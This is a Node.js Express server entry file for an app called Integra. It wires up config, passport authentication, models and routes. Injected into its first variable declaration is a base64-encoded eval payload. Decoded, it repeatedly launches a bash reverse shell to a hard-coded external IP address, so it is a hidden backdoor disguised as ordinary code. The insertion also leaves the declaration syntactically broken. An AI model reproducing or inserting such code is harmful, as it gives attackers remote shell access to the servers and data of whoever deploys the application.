/**
 * Module dependencies.
 */

var express = require('express'),
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
  fs = require('fs'),
  passport = require('passport');

/**
 * Main application entry file.
 * Please note that the order of loading is important.
 */

// Load configurations
// if test env, load example file
var env = process.env.NODE_ENV || 'development',
   config = require('./config/config'),
   auth = require('./config/middlewares/authorization');

// Bootstrap models
var models_path = __dirname + '/app/models';
fs.readdirSync(models_path).forEach(function (file) {
  if (~file.indexOf('.js')) require(models_path + '/' + file);
});

// bootstrap passport config
require('./config/passport')(passport, config);

var app = express();
// express settings
require('./config/express')(app, config, passport);

// Bootstrap routes
require('./app/controllers/routes')(app, passport, auth);


app.on('listening',function(){
    console.log('store server is running');
});

// Start the app by listening on <port>
var port = process.env.PORT || 3001;
app.listen(port);
console.log('Integra Online Server App started on port '+port);

// expose app
exports = module.exports = app;
// CATASTROPHIC ERROR
app.use(function(err, req, res, next){
  
  console.error(err.stack);
  
  // make this a nicer error later
  res.send(500, 'Ewww! Something got broken on Integra. Getting some tape and glue');
  
});
